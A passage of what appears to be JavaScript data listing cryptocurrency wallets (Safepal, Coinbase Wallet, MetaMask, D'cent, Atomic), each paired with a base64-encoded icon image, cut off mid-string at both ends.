XfTLhtqkpwfat/Y/amt017GeMmOuSs0ttKxMxOsPRM7p5Tm6dkUxnLDzZVbJSb9HPmuJQsXY2t0t9u33nFpy22HPW0x2q6/zWGzOaLVmNpd31b4eJDT6bqIwdtkWsizZOz0qfODfaku5ezn37mrzLJknNNbT0jb0e8MR2dYbYc5lAAAAAAAfn/pb+ss/wDq7vmZ9fwn5FPSGhk70upNh5QCAQAQQCAQABmKAFAAUIAUAUAAADPhZ1+PPjouspny+lXOUG/B7dq8GeL46XjS8a+qxMxs9L6Na5rtuJHKVOPqFTlODhxrHyt4vZ89uF/Dc4fE8Pwlck01mk/OPu2aXyTGu7usXpxh8aqy436fd/DzKnXF+Kl2beL2NW3L8unaxzF48pe4y12no2Oi+u2KnXOFkJerOElOL8mjRtWazpMaSyxOrIQAAAD8/wDS79Z5/wDVXfMz6/hPyKekNDJ3pdQbDyAQCAQggACAQDMUUABQAAIoAAAAAAr2bqt/VVf31/znzPNf+RPpDcw9xtGVi1XRcLq4WwfbCyCnF+5mhW9qTrWdJZJiJ3a5f0HxoyduDdkada+e+Na/Ryf80Hya8FsbteYZJjs5Yi8ecdfmxzijevRj9Jr+H60MbVal3waxMrb27eq/cetODy7TOOfnH3P6lfNmxOnOE5KrKV2n3fw82qVS8+Ls28Xseb8vy6dqml48p1Iy18ejY6LoWRU65xshJbxnCSlGS9qa7TRtWazpMaMurIQfn7pa/wDief8A1d/zM+v4T8inpDQv3pdSbDygEAhAAgEAAQDMUAKAAAUAAAAAAQCvZ+qz9VV/fX/OfM80/wCRPpDcw9xtxzmUAAYcvEqvg4XVV2wfbCyEZx+DPVL2pOtZ0lJiJ3aD0o0f/R7MfO0pzqduTXRZhxlKVN8pJ7JRft4dtvFNbbHX4XP/AKqLYs/XSNYnxhgvXsdath6VdL8XTq5Ljjblbfm8eMt2pdznt6sfPt7jT4XgsmedtK+/7Ml8kV9Xht1srJzsm+KdkpTnJ9spye7fxbPqYiIiIjwaT4KIBCABAIAAgADKUUAAAoAAAAoAABAPZeqmyL0tRTTcL7lJd8W3ut/c0fNc1iY4jX3xDbwd1uJzWZxM7U8bGW+RkU0r/uWRg35J9pkpivk7lZlJtEby1nUOsnTKt1W7smS/hVuMd/tT2/Dc3sfKs9t9K+v7asU5qw1jUetLKnusbGppX1rZSul8Fsl+JvY+UY479pn06fdjnPPhDU9V6Q52ZKM8jJsm623Wo7Vxrb5bpR257ct+06GLhsWKNKV3+P8Adim9rby6v/6Z3kAgEIAEAAQCAAAGQooACgAAACgAAAAB2Gja3lYM3Zi3SqcklOOylCa7uKL5Pz7TDm4fHmjS8avVbTXZy9R6X6nk7qzMtjH6tLVEfL6GzfvMePgsGPanz6/3Wclp8XSSbbbbbb7W3u37za8nhAAEAAQCEACAAIBAAAAB9gUoAUAAAoAAAAAAAAABAAEAAQgAQABAIAAAAAH0BQAFKAFAAAAAAAAAAIAAEEAAQABAAEAAAAACgUAAAoAABSgAAAAAAgAQAAAgAABAAACAAAAAAAoACgAAFAAAAAAAAAAAEAAAIAAAQAAAAAAAAAAoACgAAAABQIAAAAAAABAAACAAAFAgAAAAAAP/2Q==",
    },
    {
      name: "Safepal",
      icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAdVBMVEVKMO/////v7P0lDu45Hu6zsPetq/dKLu+IgvM5G+7GwvkwGe7Ev/iGgPODfPOEfvOAefNCJe9eXPGQg/SooPa7ufhqWfGzsvdHN+8tCe5wYfIyE+4rAu749/708f5ZUfBJPe/QyvpSSPCdkfVyZvKspvfn5fwhD1MtAAADvElEQVR4nO2djVriMBBFWwiEWhEqImLlR0Xf/xF31XXVpvRb6Ezmftl7noBj7zQ3NNgsI4QQQgghhBBCCCGEEEIIIYQQQgghhBBCCCEkMt5XTghv7dKGd+X14mYkwvIWT9EX+9Egl2JVwRlWdysxvTwfr619Atz9VlKwhLuCxZWgXz4u4ATdTFRwiCc4ERWsrX0ChAXxIlrMRQXxbjJuKir4YO0TIBzR0tonoJC9gngz6GRnsMYTlI0oYFVLfplgVTtJcI0nmHpVK5KfweSrmuwVZFWLTvpVTXYdTL6qDa19AljVThOEWya88I6eVS06/2FV2wzOZou3TPggoqPdeng+zloooCm4OcBdhH4UzQ3vAe8i9CKoaku8G2EvwmVil1ZEQ8EN3ld/fWjZ0Q/wGvP5tFa1pAxbq1p/Q5wjM+07+t6GboSieOThS2/D4eYCQ/HYbqK/4SCHUDy6XZIwzC/sN8BBVZM1zC+tFTsevsgYWge1a0cvZGirWHU9m5AytAyq33cIyhkaKtaPcQzNguqfugQlDa0WjWoRzdAoqO4lnmF+aRFUN45oaDKL1XNMQ4tZ9IeohhazWL9GNTQIamelUTA0UKy7fkGhYBg/qN5dxDU0UCwv4xrGD6ovj15FHcP4i8bxoCoZAs2ilqFFUNtnUc0QZhb1DFFmUdEQZNHQNMSYRVXDfBX7AXNLUHUN83kl8sH/nVBR2fA1+imBIKjKhvl9/A1xY9HQNnyOHdMgqNqGY4PTOt59D6q24YvFeaQfs6htuIif0uznLGobPhl90/81i8qGj1Znyr6Cqmy4t3vk9qmoaxi90nzjM6iqhhPTg51/FDUNZ8YnVz+Cqmg4K0Q+Zw/eFw09Q9uIfvAWVDVDBMF3xY2S4RxC8E1x1PeTtBtOzWfwE9/7T91qiBFRIdoMpwiHFcVoMZzDRFSE9SbpiP4e5F3iglm9bAheJSbomic97KuaKL4+NKYQMKKuxy8P17tmRCdwy4Svx9vzfz4a3EXxlglfdB96O5EJnGBWywrCzaBfiwriVTVfigpewUVUegbhIpoNExf0sjcZvKomHFGcHf1fZG8yeBHNHhIXFF4mWNXiw6p2EjO8qiYbUVa1+MhGFE9QuKqhPHz5glXtNPAiKlzVpnCCrGqnARjR5Kua7FcW1udkQtKvaqI3me093BWUrWqrO8PDeEeo5F4zNhjt8f5XaeZvlzKvwbtZXJdwu8F3vNSrDCsP6UcIIYQQQgghhBBCCCGEEEIIIYQQQgghhBBC0uYXEco+M9GuUU4AAAAASUVORK5CYII=",
    },
    {
      name: "Coinbase Wallet",
      icon: "data:image/png;base64,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",
    },
    {
      name: "MetaMask",
      icon: "data:image/png;base64,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",
    },
    {
      name: "D'cent",
      icon: "data:image/png;base64,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",
    },
    {
      name: "Atomic",
      icon: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAA81BMVEUiLlEroPspnfsto/sqn/som/snmvssovsjlPo3svw2sPw8ufwzrPw5tfwvpvshkfo/vv09u/wklvoxqftAwP0iKUohJUciJ0YhKk0hI0IiK0shI0Qgk/9CxP8iLlIyrf8gHkEkOF0lQ2wjSXsiOWQibr08quEmQ2koTnY0j8U3ntkveq0wiMMrbqMteLE0o+soYJMthccpb6wsleYphNAlX5knecIkVY0jP2wlbbMlht0iUIshdsshh+ogft4tZ5I0iLkvcp81lc4qWYU3od81nd0vf7cwkdUuluIqfL0mU4Uplu4lZKMmescliOIjV5QiZbHkh+k3AAAK1UlEQVR4nO1bCVvaSheWNeyyTRZAJEArar1VxIp7v2rrgtv//zXfbEkmyQHxXsjSZ15NmMCZmfc952TmENuNDQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJiVCgI7XdI2irSA+bzOqh93o7N/u7e1+/ft3b3b/Z6fX+KpG6qt7sNptbDprN3RtV/VtE6m3zZ5WIcmFrq/pzpx02t5VANX82vfK4yOauqYZN7z9D791Ut5pV/NOkR7PKzk363lb1f3G/H/Xu3haVJaLpvDS39rqxlqju1LZsRYBIjK3aTowzVR3VmnOEiRjFVqI6AgX9PRL1ndqSCms78bwX1a9LCqxWv8ZSYe+XddfV7JP4hojmr17YdD8P9aZZrVE4L7yFX6u8bb3ZvInfrWgWa5+CGbdEbe9WP1YloLobsyDqo88JxBJjtp729qpFlqZF67VWBPPWfnOvFzbpz0AfNYtEEj8VrVbNuRSuqPpisx+nIPZ+sfAR7nYYacsJXJGdi3YUY7VjmDRk7vhRLWw7tMPHFFqGZti0l4e6Xy2CuNu/Hd3u39XAD6v78VlO0R0ooXzbU5GO1N7tHP2xUaiPwCDd2Y8sVBN2wSgua436DVTYR7YFGrmDy1+/xeXJFCKMy+UyOWH2rFHbF+n3/tTou2Vuxg1jEkN0W2XSKGl24Lb7JtOZfhY+yxnVWzRnzGih98tKu3LZycQ/boXqH+4CKq3MjWOyJXbLEHY8ViZoFYsHb+pBEaD+27sTqL8Bq+JBHDaMNkjd9w1XPQQdEYPVVO+D6ef7gqvDaRqD8lvd98UmXy4DO137GxTrGFRu+h1EHNgG0K0/TfPlu8jHUB9Bt1ceur3aecgXka/ccO7ly3kCdiav5fIfKPfaf7B0wZiEMA/lc7TQzgMoguuH3i9CxhFXiA4h1r7NkEH9DdiWI165te8h0v/MUXhQBqzvIx1E3YTyLj/v8YRZAK2jvNagA8ywUCjkC+TMT/Oj0r4vMGui1OpSPohymqq/La5WQEjjcB5ldGi5w1JIzlGu3PR+Ic/VFYQoduf3IMaWfd6SGeHKTf2HKmKwmwt2uPaR0MHuOGdhigL0736+hfKCKkUflYEe3yMbQ30ERKRQ6C3o0oM6LPJJuGgfAXQX55wrr20cRXWtUQuFUgn/4oPwLJHLUn7huqH38wW7C/2lXSN6I9K1v8SFlShx3LxfzFa9Z76gfRjw5dz9JVzg/ZsFoiCeP3jygmsEbkq0Wb0iWrmZJRcKLI4f/UHJ9PRhp0j+GQodFEp+fBiN9j3Q66PIhwP1AaL64R2FDiHHPETwRsQVG8C09DFTFepWimDlpj4CCreX2NmMI0jhY/TSFH2HknSJUMDB/x45hfoA5Kkt0VUFffM